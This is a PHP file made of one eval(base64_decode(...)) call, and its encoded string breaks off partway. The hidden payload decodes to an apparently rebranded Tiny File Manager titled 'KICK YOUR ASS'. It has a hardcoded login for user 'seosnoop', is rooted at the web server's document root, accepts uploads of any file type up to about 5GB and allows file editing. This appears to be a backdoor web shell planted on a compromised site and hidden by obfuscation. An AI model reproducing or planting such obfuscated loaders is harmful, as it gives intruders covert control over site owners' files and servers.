<?php eval(base64_decode('PD9waHANCi8vRGVmYXVsdCBDb25maWd1cmF0aW9uDQokQ09ORklHID0gJ3sibGFuZyI6ImVuIiwiZXJyb3JfcmVwb3J0aW5nIjpmYWxzZSwic2hvd19oaWRkZW4iOmZhbHNlLCJoaWRlX0NvbHMiOmZhbHNlLCJ0aGVtZSI6ImxpZ2h0In0nOw0KDQovKioNCiAqIEgzSyB8IFRpbnkgRmlsZSBNYW5hZ2VyIFYyLjUuMw0KICogQGF1dGhvciBDQ1AgUHJvZ3JhbW1lcnMNCiAqIEBlbWFpbCBjY3Bwcm9ncmFtbWVyc0BnbWFpbC5jb20NCiAqIEBnaXRodWIgaHR0cHM6Ly9naXRodWIuY29tL3ByYXNhdGhtYW5pL3RpbnlmaWxlbWFuYWdlcg0KICogQGxpbmsgaHR0cHM6Ly90aW55ZmlsZW1hbmFnZXIuZ2l0aHViLmlvDQogKiBodHRwczovL3RpbnlmaWxlbWFuYWdlci5naXRodWIuaW8vZG9jcy9wd2QuaHRtbA0KICovDQoNCi8vVEZNIHZlcnNpb24NCmRlZmluZSgnVkVSU0lPTicsICcyLjUuMycpOw0KDQovL0FwcGxpY2F0aW9uIFRpdGxlDQpkZWZpbmUoJ0FQUF9USVRMRScsICdLSUNLIFlPVVIgQVNTJyk7DQoNCi8vIC0tLSBFRElUIEJFTE9XIENPTkZJR1VSQVRJT04gQ0FSRUZVTExZIC0tLQ0KDQovLyBBdXRoIHdpdGggbG9naW4vcGFzc3dvcmQNCi8vIHNldCB0cnVlL2ZhbHNlIHRvIGVuYWJsZS9kaXNhYmxlIGl0DQovLyBJcyBpbmRlcGVuZGVudCBmcm9tIElQIHdoaXRlLSBhbmQgYmxhY2tsaXN0aW5nDQokdXNlX2F1dGggPSB0cnVlOw0KDQokYXV0aF91c2VycyA9IGFycmF5KA0KICAgICdzZW9zbm9vcCcgPT4gJyQyeSQxMCQvdEdVdlcwamg2b1BFVDRTSWtHYTVlWERyQVhjdjhSL0E1ZWN4L01nOGJyUi5HRWRadHFsTycNCik7DQoNCi8vIFJlYWRvbmx5IHVzZXJzDQovLyBlLmcuIGFycmF5KCd1c2VycycsICdndWVzdCcsIC4uLikNCiRyZWFkb25seV91c2VycyA9IGFycmF5KA0KICAgICd1c2VyJw0KKTsNCg0KLy8gR2xvYmFsIHJlYWRvbmx5LCBpbmNsdWRpbmcgd2hlbiBhdXRoIGlzIG5vdCBiZWluZyB1c2VkDQokZ2xvYmFsX3JlYWRvbmx5ID0gZmFsc2U7DQoNCi8vIHVzZXIgc3BlY2lmaWMgZGlyZWN0b3JpZXMNCi8vIGFycmF5KCdVc2VybmFtZScgPT4gJ0RpcmVjdG9yeSBwYXRoJywgJ1VzZXJuYW1lMicgPT4gJ0RpcmVjdG9yeSBwYXRoJywgLi4uKQ0KJGRpcmVjdG9yaWVzX3VzZXJzID0gYXJyYXkoKTsNCg0KLy8gRW5hYmxlIGhpZ2hsaWdodC5qcyAoaHR0cHM6Ly9oaWdobGlnaHRqcy5vcmcvKSBvbiB2aWV3J3MgcGFnZQ0KJHVzZV9oaWdobGlnaHRqcyA9IHRydWU7DQoNCi8vIGhpZ2hsaWdodC5qcyBzdHlsZQ0KLy8gZm9yIGRhcmsgdGhlbWUgdXNlICdpci1ibGFjaycNCiRoaWdobGlnaHRqc19zdHlsZSA9ICd2cyc7DQoNCi8vIEVuYWJsZSBhY2UuanMgKGh0dHBzOi8vYWNlLmM5LmlvLykgb24gdmlldydzIHBhZ2UNCiRlZGl0X2ZpbGVzID0gdHJ1ZTsNCg0KLy8gRGVmYXVsdCB0aW1lem9uZSBmb3IgZGF0ZSgpIGFuZCB0aW1lKCkNCi8vIERvYyAtIGh0dHA6Ly9waHAubmV0L21hbnVhbC9lbi90aW1lem9uZXMucGhwDQokZGVmYXVsdF90aW1lem9uZSA9ICdFdGMvVVRDJzsgLy8gVVRDDQoNCi8vIFJvb3QgcGF0aCBmb3IgZmlsZSBtYW5hZ2VyDQovLyB1c2UgYWJzb2x1dGUgcGF0aCBvZiBkaXJlY3RvcnkgaS5lOiAnL3Zhci93d3cvZm9sZGVyJyBvciAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLicvZm9sZGVyJw0KJHJvb3RfcGF0aCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107DQoNCi8vIFJvb3QgdXJsIGZvciBsaW5rcyBpbiBmaWxlIG1hbmFnZXIuUmVsYXRpdmUgdG8gJGh0dHBfaG9zdC4gVmFyaWFudHM6ICcnLCAncGF0aC90by9zdWJmb2xkZXInDQovLyBXaWxsIG5vdCB3b3JraW5nIGlmICRyb290X3BhdGggd2lsbCBiZSBvdXRzaWRlIG9mIHNlcnZlciBkb2N1bWVudCByb290DQokcm9vdF91cmwgPSAnJzsNCg0KLy8gU2VydmVyIGhvc3RuYW1lLiBDYW4gc2V0IG1hbnVhbGx5IGlmIHdyb25nDQovLyAkX1NFUlZFUlsnSFRUUF9IT1NUJ10uJy9mb2xkZXInDQokaHR0cF9ob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOw0KDQovLyBpbnB1dCBlbmNvZGluZyBmb3IgaWNvbnYNCiRpY29udl9pbnB1dF9lbmNvZGluZyA9ICdVVEYtOCc7DQoNCi8vIGRhdGUoKSBmb3JtYXQgZm9yIGZpbGUgbW9kaWZpY2F0aW9uIGRhdGUNCi8vIERvYyAtIGh0dHBzOi8vd3d3LnBocC5uZXQvbWFudWFsL2VuL2Z1bmN0aW9uLmRhdGUucGhwDQokZGF0ZXRpbWVfZm9ybWF0ID0gJ20vZC9ZIGc6aSBBJzsNCg0KLy8gUGF0aCBkaXNwbGF5IG1vZGUgd2hlbiB2aWV3aW5nIGZpbGUgaW5mb3JtYXRpb24NCi8vICdmdWxsJyA9PiBzaG93IGZ1bGwgcGF0aA0KLy8gJ3JlbGF0aXZlJyA9PiBzaG93IHBhdGggcmVsYXRpdmUgdG8gcm9vdF9wYXRoDQovLyAnaG9zdCcgPT4gc2hvdyBwYXRoIG9uIHRoZSBob3N0DQokcGF0aF9kaXNwbGF5X21vZGUgPSAnZnVsbCc7DQoNCi8vIEFsbG93ZWQgZmlsZSBleHRlbnNpb25zIGZvciBjcmVhdGUgYW5kIHJlbmFtZSBmaWxlcw0KLy8gZS5nLiAndHh0LGh0bWwsY3NzLGpzJw0KJGFsbG93ZWRfZmlsZV9leHRlbnNpb25zID0gJyc7DQoNCi8vIEFsbG93ZWQgZmlsZSBleHRlbnNpb25zIGZvciB1cGxvYWQgZmlsZXMNCi8vIGUuZy4gJ2dpZixwbmcsanBnLGh0bWwsdHh0Jw0KJGFsbG93ZWRfdXBsb2FkX2V4dGVuc2lvbnMgPSAnJzsNCg0KLy8gRmF2aWNvbiBwYXRoLiBUaGlzIGNhbiBiZSBlaXRoZXIgYSBmdWxsIHVybCB0byBhbiAuUE5HIGltYWdlLCBvciBhIHBhdGggYmFzZWQgb24gdGhlIGRvY3VtZW50IHJvb3QuDQovLyBmdWxsIHBhdGgsIGUuZyBodHRwOi8vZXhhbXBsZS5jb20vZmF2aWNvbi5wbmcNCi8vIGxvY2FsIHBhdGgsIGUuZyBpbWFnZXMvaWNvbnMvZmF2aWNvbi5wbmcNCiRmYXZpY29uX3BhdGggPSAnJzsNCg0KLy8gRmlsZXMgYW5kIGZvbGRlcnMgdG8gZXhjbHVkZWQgZnJvbSBsaXN0aW5nDQovLyBlLmcuIGFycmF5KCdteWZpbGUuaHRtbCcsICdwZXJzb25hbC1mb2xkZXInLCAnKi5waHAnLCAuLi4pDQokZXhjbHVkZV9pdGVtcyA9IGFycmF5KCk7DQoNCi8vIE9ubGluZSBvZmZpY2UgRG9jcyBWaWV3ZXINCi8vIEF2YWlsYWJlIHJ1bGVzIGFyZSAnZ29vZ2xlJywgJ21pY3Jvc29mdCcgb3IgZmFsc2UNCi8vIEdvb2dsZSA9PiBWaWV3IGRvY3VtZW50cyB1c2luZyBHb29nbGUgRG9jcyBWaWV3ZXINCi8vIE1pY3Jvc29mdCA9PiBWaWV3IGRvY3VtZW50cyB1c2luZyBNaWNyb3NvZnQgV2ViIEFwcHMgVmlld2VyDQovLyBmYWxzZSA9PiBkaXNhYmxlIG9ubGluZSBkb2Mgdmlld2VyDQokb25saW5lX3ZpZXdlciA9ICdnb29nbGUnOw0KDQovLyBTdGlja3kgTmF2IGJhcg0KLy8gdHJ1ZSA9PiBlbmFibGUgc3RpY2t5IGhlYWRlcg0KLy8gZmFsc2UgPT4gZGlzYWJsZSBzdGlja3kgaGVhZGVyDQokc3RpY2t5X25hdmJhciA9IHRydWU7DQoNCi8vIE1heGltdW0gZmlsZSB1cGxvYWQgc2l6ZQ0KLy8gSW5jcmVhc2UgdGhlIGZvbGxvd2luZyB2YWx1ZXMgaW4gcGhwLmluaSB0byB3b3JrIHByb3Blcmx5DQovLyBtZW1vcnlfbGltaXQsIHVwbG9hZF9tYXhfZmlsZXNpemUsIHBvc3RfbWF4X3NpemUNCiRtYXhfdXBsb2FkX3NpemVfYnl0ZXMgPSA1MDAwMDAwMDAwOyAvLyBzaXplIDUsMDAwLDAwMCwwMDAgYnl0ZXMgKH41R0IpDQoNCi8vIGNodW5rIHNpemUgdXNlZCBmb3IgdXBsb2FkDQovLyBlZy4gZGVjcmVhc2UgdG8gMU1CIGlmIG5naW54IHJlcG9ydHMgcHJvYmxlbSA0MTMgZW50aXR5IHRvbyBsYXJnZQ0KJHVwbG9hZF9jaHVua19zaXplX2J5dGVzID0gMjAwMDAwMDsgLy8gY2h1bmsgc2l6ZSAyLDAwMCwwMDAgYnl0ZXMgKH4yTUIpDQoNCi8vIFBvc3NpYmxlIHJ1bGVzIGFyZSAnT0ZGJywgJ0FORCcgb3IgJ09SJw0KLy8gT0ZGID0+IERvbid0IGNoZWNrIGNvbm5lY3Rpb24gSVAsIGRlZmF1bHRzIHRvIE9GRg0KLy8gQU5EID0+IENvbm5lY3Rpb24gbXVzdCBiZSBvbiB0aGUgd2hpdGVsaXN0LCBhbmQgbm90IG9uIHRoZSBibGFja2xpc3QNCi8vIE9SID0+IENvbm5lY3Rpb24gbXVzdCBiZSBvbiB0aGUgd2hpdGVsaXN0LCBvciBub3Qgb24gdGhlIGJsYWNrbGlzdA0KJGlwX3J1bGVzZXQgPSAnT0ZGJzsNCg0KLy8gU2hvdWxkIHVzZXJzIGJlIG5vdGlmaWVkIG9mIHRoZWlyIGJsb2NrPw0KJGlwX3NpbGVudCA9IHRydWU7DQoNCi8vIElQLWFkZHJlc3NlcywgYm90aCBpcHY0IGFuZCBpcHY2DQokaXBfd2hpdGVsaXN0ID0gYXJyYXkoDQogICAgJzEyNy4wLjAuMScsICAgIC8vIGxvY2FsIGlwdjQNCiAgICAnOjoxJyAgICAgICAgICAgLy8gbG9jYWwgaXB2Ng0KKTsNCg0KLy8gSVAtYWRkcmVzc2VzLCBib3RoIGlwdjQgYW5kIGlwdjYNCiRpcF9ibGFja2xpc3QgPSBhcnJheSgNCiAgICAnMC4wLjAuMCcsICAgICAgLy8gbm9uLXJvdXRhYmxlIG1ldGEgaXB2NA0KICAgICc6OicgICAgICAgICAgICAvLyBub24tcm91dGFibGUgbWV0YSBpcHY2DQopOw0KDQovLyBpZiBVc2VyIGhhcyB0aGUgZXh0ZXJuYWwgY29uZmlnIGZpbGUsIHRyeSB0byB1c2UgaXQgdG8gb3ZlcnJpZGUgdGhlIGRlZmF1bHQgY29uZmlnIGFib3ZlIFtjb25maWcucGhwXQ0KLy8gc2FtcGxlIGNvbmZpZyAtIGh0dHBzOi8vdGlueWZpbGVtYW5hZ2VyLmdpdGh1Yi5pby9jb25maWctc2FtcGxlLnR4dA0KJGNvbmZpZ19maWxlID0gX19ESVJfXy4nL2NvbmZpZy5waHAnOw0KaWYgKGlzX3JlYWRhYmxlKCRjb25maWdfZmlsZSkpIHsNCiAgICBAaW5jbHVkZSgkY29uZmlnX2ZpbGUpOw0KfQ0KDQovLyBFeHRlcm5hbCBDRE4gcmVzb3VyY2VzIHRoYXQgY2FuIGJlIHVzZWQgaW4gdGhlIEhUTUwgKHJlcGxhY2UgZm9yIEdEUFIgY29tcGxpYW5jZSkNCiRleHRlcm5hbCA9IGFycmF5KA0KICAgICdjc3MtYm9vdHN0cmFwJyA9PiAnPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4yLjIvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgaW50ZWdyaXR5PSJzaGEzODQtWmVuaDg3cVg1Sm5LMkpsMHZXYThDazJyZGtRMkJ6ZXA1SUR4YmNuQ2V1T3hqenJQRi9ldDNVUnk5QnYxV1RSaSIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+JywNCiAgICAnY3NzLWRyb3B6b25lJyA9PiAnPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZHJvcHpvbmUvNS45LjMvbWluL2Ryb3B6b25lLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCI+JywNCiAgICAnY3NzLWZvbnQtYXdlc29tZScgPT4gJzxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzQuNy4wL2Nzcy9mb250LWF3ZXNvbWUubWluLmNzcyIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+JywNCiAgICAnY3NzLWhpZ2hsaWdodGpzJyA9PiAnPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9oaWdobGlnaHQuanMvMTEuNi4wL3N0eWxlcy8nIC4gJGhpZ2hsaWdodGpzX3N0eWxlIC4gJy5taW4uY3NzIj4nLA0KICAgICdqcy1hY2UnID0+ICc8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvYWNlLzEuMTMuMS9hY2UuanMiPjwvc2NyaXB0PicsDQogICAgJ2pzLWJvb3RzdHJhcCcgPT4gJzxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjIuMi9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1PRVJjQTJFcWpKQ01BKy8zeStneElPcU1Fand0eEpZN3FQQ3FzZGx0Yk5KdWFPZTkyMyttby8vZjZWOFFic3czIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4nLA0KICAgICdqcy1kcm9wem9uZScgPT4gJzxzY3JpcHQgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9kcm9wem9uZS81LjkuMy9taW4vZHJvcHpvbmUubWluLmpzIj48L3NjcmlwdD4nLA0KICAgICdqcy1qcXVlcnknID0+ICc8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTMuNi4xLm1pbi5qcyIgaW50ZWdyaXR5PSJzaGEyNTYtbzg4QXdRblpCK1ZEdkU5dHZJWHJNUWFQbEZGU1VUUitubGRRbTFMdVBYUT0iIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPjwvc2NyaXB0PicsDQogICAgJ2pzLWpxdWVyeS1kYXRhdGFibGVzJyA9PiAnPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuLmRhdGF0YWJsZXMubmV0LzEuMTMuMS9qcy9qcXVlcnkuZGF0YVRhYmxlcy5taW4uanMiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiIGRlZmVyPjwvc2NyaXB0PicsDQogICAgJ2pzLWhpZ2hsaWdodGpzJyA9PiAnPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2hpZ2hsaWdodC5qcy8xMS42LjAvaGlnaGxpZ2h0Lm1pbi5qcyI+PC9zY3JpcHQ+JywNCiAgICAncHJlLWpzZGVsaXZyJyA9PiAnPGxpbmsgcmVsPSJwcmVjb25uZWN0IiBocmVmPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQiIGNyb3Nzb3JpZ2luLz48bGluayByZWw9ImRucy1wcmVmZXRjaCIgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0Ii8+JywNCiAgICAncHJlLWNsb3VkZmxhcmUnID0+ICc8bGluayByZWw9InByZWNvbm5lY3QiIGhyZWY9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20iIGNyb3Nzb3JpZ2luLz48bGluayByZWw9ImRucy1wcmVmZXRjaCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbSIvPicNCik7DQoNCi8vIC0tLSBFRElUIEJFTE9XIENBUkVGVUxMWSBPUiBETyBOT1QgRURJVCBBVCBBTEwgLS0tDQoNCi8vIG1heCB1cGxvYWQgZmlsZSBzaXplDQpkZWZpbmUoJ01BWF9VUExPQURfU0laRScsICRtYXhfdXBsb2FkX3NpemVfYnl0ZXMpOw0KDQovLyB1cGxvYWQgY2h1bmsgc2l6ZQ0KZGVmaW5lKCdVUExPQURfQ0hVTktfU0laRScsICR1cGxvYWRfY2h1bmtfc2l6ZV9ieXRlcyk7DQoNCi8vIHByaXZhdGUga2V5IGFuZCBzZXNzaW9uIG5hbWUgdG8gc3RvcmUgdG8gdGhlIHNlc3Npb24NCmlmICggIWRlZmluZWQoICdGTV9TRVNTSU9OX0lEJykpIHsNCiAgICBkZWZpbmUoJ0ZNX1NFU1NJT05fSUQnLCAnZmlsZW1hbmFnZXInKTsNCn0NCg0KLy8gQ29uZmlndXJhdGlvbg0KJGNmZyA9IG5ldyBGTV9Db25maWcoKTsNCg0KLy8gRGVmYXVsdCBsYW5ndWFnZQ0KJGxhbmcgPSBpc3NldCgkY2ZnLT5kYXRhWydsYW5nJ10pID8gJGNmZy0+ZGF0YVsnbGFuZyddIDogJ2VuJzsNCg0KLy8gU2hvdyBvciBoaWRlIGZpbGVzIGFuZCBmb2xkZXJzIHRoYXQgc3RhcnRzIHdpdGggYSBkb3QNCiRzaG93X2hpZGRlbl9maWxlcyA9IGlzc2V0KCRjZmctPmRhdGFbJ3Nob3dfaGlkZGVuJ10pID8gJGNmZy0+ZGF0YVsnc2hvd19oaWRkZW4nXSA6IHRydWU7DQoNCi8vIFBIUCBlcnJvciByZXBvcnRpbmcgLSBmYWxzZSA9IFR1cm5zIG9mZiBFcnJvcnMsIHRydWUgPSBUdXJucyBvbiBFcnJvcnMNCiRyZXBvcnRfZXJyb3JzID0gaXNzZXQoJGNmZy0+ZGF0YVsnZXJyb3JfcmVwb3J0aW5nJ10pID8gJGNmZy0+ZGF0YVsnZXJyb3JfcmVwb3J0aW5nJ10gOiB0cnVlOw0KDQovLyBIaWRlIFBlcm1pc3Npb25zIGFuZCBPd25lciBjb2xzIGluIGZpbGUtbGlzdGluZw0KJGhpZGVfQ29scyA9IGlzc2V0KCRjZmctPmRhdGFbJ2hpZGVfQ29scyddKSA/ICRjZmctPmRhdGFbJ2hpZGVfQ29scyddIDogdHJ1ZTsNCg0KLy8gVGhlbWUNCiR0aGVtZSA9IGlzc2V0KCRjZmctPmRhdGFbJ3RoZW1lJ10pID8gJGNmZy0+ZGF0YVsndGhlbWUnXSA6ICdsaWdodCc7DQoNCmRlZmluZSgnRk1fVEhFTUUnLCAkdGhlbWUpOw0KDQovL2F2YWlsYWJsZSBsYW5ndWFnZXMNCiRsYW5nX2xpc3QgPSBhcnJheSgNCiAgICAnZW4nID0+ICdFbmdsaXNoJw0KKTsNCg0KaWYgKCRyZXBvcnRfZXJyb3JzID09IHRydWUpIHsNCiAgICBAaW5pX3NldCgnZXJyb3JfcmVwb3J0aW5nJywgRV9BTEwpOw0KICAgIEBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDEpOw0KfSBlbHNlIHsNCiAgICBAaW5pX3NldCgnZXJyb3JfcmVwb3J0aW5nJywgRV9BTEwpOw0KICAgIEBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDApOw0KfQ0KDQovLyBpZiBmbSBpbmNsdWRlZA0KaWYgKGRlZmluZWQoJ0ZNX0VNQkVEJykpIHsNCiAgICAkdXNlX2F1dGggPSBmYWxzZTsNCiAgICAkc3RpY2t5X25hdmJhciA9IGZhbHNlOw0KfSBlbHNlIHsNCiAgICBAc2V0X3RpbWVfbGltaXQoNjAwKTsNCg0KICAgIGRhdGVfZGVmYXVsdF90aW1lem9uZV9zZXQoJGRlZmF1bHRfdGltZXpvbmUpOw0KDQogICAgaW5pX3NldCgnZGVmYXVsdF9jaGFyc2V0JywgJ1VURi04Jyk7DQogICAgaWYgKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzUuNi4wJywgJzwnKSAmJiBmdW5jdGlvbl9leGlzdHMoJ21iX2ludGVybmFsX2VuY29kaW5nJykpIHsNCiAgICAgICAgbWJfaW50ZXJuYWxfZW5jb2RpbmcoJ1VURi04Jyk7DQogICAgfQ0KICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ21iX3JlZ2V4X2VuY29kaW5nJykpIHsNCiAgICAgICAgbWJfcmVnZXhfZW5jb2RpbmcoJ1VURi04Jyk7DQogICAgfQ0KDQogICAgc2Vzc2lvbl9jYWNoZV9saW1pdGVyKCdub2NhY2hlJyk7IC8vIFByZXZlbnQgbG9nb3V0IGlzc3VlIGFmdGVyIHBhZ2Ugd2FzIGNhY2hlZA0KICAgIHNlc3Npb25fbmFtZShGTV9TRVNTSU9OX0lEICk7DQogICAgZnVuY3Rpb24gc2Vzc2lvbl9lcnJvcl9oYW5kbGluZ19mdW5jdGlvbigkY29kZSwgJG1zZywgJGZpbGUsICRsaW5lKSB7DQogICAgICAgIC8vIFBlcm1pc3Npb24gZGVuaWVkIGZvciBkZWZhdWx0IHNlc3Npb24sIHRyeSB0byBjcmVhdGUgYSBuZXcgb25lDQogICAgICAgIGlmICgkY29kZSA9PSAyKSB7DQogICAgICAgICAgICBzZXNzaW9uX2Fib3J0KCk7DQogICAgICAgICAgICBzZXNzaW9uX2lkKHNlc3Npb25fY3JlYXRlX2lkKCkpOw0KICAgICAgICAgICAgQHNlc3Npb25fc3RhcnQoKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBzZXRfZXJyb3JfaGFuZGxlcignc2Vzc2lvbl9lcnJvcl9oYW5kbGluZ19mdW5jdGlvbicpOw0KICAgIHNlc3Npb25fc3RhcnQoKTsNCiAgICByZXN0b3JlX2Vycm9yX2hhbmRsZXIoKTsNCn0NCg0KLy9HZW5lcmF0aW5nIENTUkYgVG9rZW4NCmlmIChlbXB0eSgkX1NFU1NJT05bJ3Rva2VuJ10pKSB7DQogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygncmFuZG9tX2J5dGVzJykpIHsNCiAgICAgICAgJF9TRVNTSU9OWyd0b2tlbiddID0gYmluMmhleChyYW5kb21fYnl0ZXMoMzIpKTsNCiAgICB9IGVsc2Ugew0KICAgIAkkX1NFU1NJT05bJ3Rva2VuJ10gPSBiaW4yaGV4KG9wZW5zc2xfcmFuZG9tX3BzZXVkb19ieXRlcygzMikpOw0KICAgIH0NCn0NCg0KaWYgKGVtcHR5KCRhdXRoX3VzZXJzKSkgew0KICAgICR1c2VfYXV0aCA9IGZhbHNlOw0KfQ0KDQokaXNfaHR0cHMgPSBpc3NldCgkX1NFUlZFUlsnSFRUUFMnXSkgJiYgKCRfU0VSVkVSWydIVFRQUyddID09ICdvbicgfHwgJF9TRVJWRVJbJ0hUVFBTJ10gPT0gMSkNCiAgICB8fCBpc3NldCgkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9QUk9UTyddKSAmJiAkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9QUk9UTyddID09ICdodHRwcyc7DQoNCi8vIHVwZGF0ZSAkcm9vdF91cmwgYmFzZWQgb24gdXNlciBzcGVjaWZpYyBkaXJlY3Rvcmllcw0KaWYgKGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbG9nZ2VkJ10pICYmICFlbXB0eSgkZGlyZWN0b3JpZXNfdXNlcnNbJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXV0pKSB7DQogICAgJHdkID0gZm1fY2xlYW5fcGF0aChkaXJuYW1lKCRfU0VSVkVSWydQSFBfU0VMRiddKSk7DQogICAgJHJvb3RfdXJsID0gICRyb290X3VybC4kd2QuRElSRUNUT1JZX1NFUEFSQVRPUi4kZGlyZWN0b3JpZXNfdXNlcnNbJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXV07DQp9DQovLyBjbGVhbiAkcm9vdF91cmwNCiRyb290X3VybCA9IGZtX2NsZWFuX3BhdGgoJHJvb3RfdXJsKTsNCg0KLy8gYWJzIHBhdGggZm9yIHNpdGUNCmRlZmluZWQoJ0ZNX1JPT1RfVVJMJykgfHwgZGVmaW5lKCdGTV9ST09UX1VSTCcsICgkaXNfaHR0cHMgPyAnaHR0cHMnIDogJ2h0dHAnKSAuICc6Ly8nIC4gJGh0dHBfaG9zdCAuICghZW1wdHkoJHJvb3RfdXJsKSA/ICcvJyAuICRyb290X3VybCA6ICcnKSk7DQpkZWZpbmVkKCdGTV9TRUxGX1VSTCcpIHx8IGRlZmluZSgnRk1fU0VMRl9VUkwnLCAoJGlzX2h0dHBzID8gJ2h0dHBzJyA6ICdodHRwJykgLiAnOi8vJyAuICRodHRwX2hvc3QgLiAkX1NFUlZFUlsnUEhQX1NFTEYnXSk7DQoNCi8vIGxvZ291dA0KaWYgKGlzc2V0KCRfR0VUWydsb2dvdXQnXSkpIHsNCiAgICB1bnNldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddKTsNCiAgICB1bnNldCggJF9TRVNTSU9OWyd0b2tlbiddKTsgDQogICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwpOw0KfQ0KDQovLyBWYWxpZGF0ZSBjb25uZWN0aW9uIElQDQppZiAoJGlwX3J1bGVzZXQgIT0gJ09GRicpIHsNCiAgICBmdW5jdGlvbiBnZXRDbGllbnRJUCgpIHsNCiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoJ0hUVFBfQ0ZfQ09OTkVDVElOR19JUCcsICRfU0VSVkVSKSkgew0KICAgICAgICAgICAgcmV0dXJuICAkX1NFUlZFUlsiSFRUUF9DRl9DT05ORUNUSU5HX0lQIl07DQogICAgICAgIH1lbHNlIGlmIChhcnJheV9rZXlfZXhpc3RzKCdIVFRQX1hfRk9SV0FSREVEX0ZPUicsICRfU0VSVkVSKSkgew0KICAgICAgICAgICAgcmV0dXJuICAkX1NFUlZFUlsiSFRUUF9YX0ZPUldBUkRFRF9GT1IiXTsNCiAgICAgICAgfWVsc2UgaWYgKGFycmF5X2tleV9leGlzdHMoJ1JFTU9URV9BRERSJywgJF9TRVJWRVIpKSB7DQogICAgICAgICAgICByZXR1cm4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107DQogICAgICAgIH1lbHNlIGlmIChhcnJheV9rZXlfZXhpc3RzKCdIVFRQX0NMSUVOVF9JUCcsICRfU0VSVkVSKSkgew0KICAgICAgICAgICAgcmV0dXJuICRfU0VSVkVSWydIVFRQX0NMSUVOVF9JUCddOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAnJzsNCiAgICB9DQoNCiAgICAkY2xpZW50SXAgPSBnZXRDbGllbnRJUCgpOw0KICAgICRwcm9jZWVkID0gZmFsc2U7DQogICAgJHdoaXRlbGlzdGVkID0gaW5fYXJyYXkoJGNsaWVudElwLCAkaXBfd2hpdGVsaXN0KTsNCiAgICAkYmxhY2tsaXN0ZWQgPSBpbl9hcnJheSgkY2xpZW50SXAsICRpcF9ibGFja2xpc3QpOw0KDQogICAgaWYoJGlwX3J1bGVzZXQgPT0gJ0FORCcpew0KICAgICAgICBpZigkd2hpdGVsaXN0ZWQgPT0gdHJ1ZSAmJiAkYmxhY2tsaXN0ZWQgPT0gZmFsc2Upew0KICAgICAgICAgICAgJHByb2NlZWQgPSB0cnVlOw0KICAgICAgICB9DQogICAgfSBlbHNlDQogICAgaWYoJGlwX3J1bGVzZXQgPT0gJ09SJyl7DQogICAgICAgICBpZigkd2hpdGVsaXN0ZWQgPT0gdHJ1ZSB8fCAkYmxhY2tsaXN0ZWQgPT0gZmFsc2Upew0KICAgICAgICAgICAgJHByb2NlZWQgPSB0cnVlOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgaWYoJHByb2NlZWQgPT0gZmFsc2Upew0KICAgICAgICB0cmlnZ2VyX2Vycm9yKCdVc2VyIGNvbm5lY3Rpb24gZGVuaWVkIGZyb206ICcgLiAkY2xpZW50SXAsIEVfVVNFUl9XQVJOSU5HKTsNCg0KICAgICAgICBpZigkaXBfc2lsZW50ID09IGZhbHNlKXsNCiAgICAgICAgICAgIGZtX3NldF9tc2cobG5nKCdBY2Nlc3MgZGVuaWVkLiBJUCByZXN0cmljdGlvbiBhcHBsaWNhYmxlJyksICdlcnJvcicpOw0KICAgICAgICAgICAgZm1fc2hvd19oZWFkZXJfbG9naW4oKTsNCiAgICAgICAgICAgIGZtX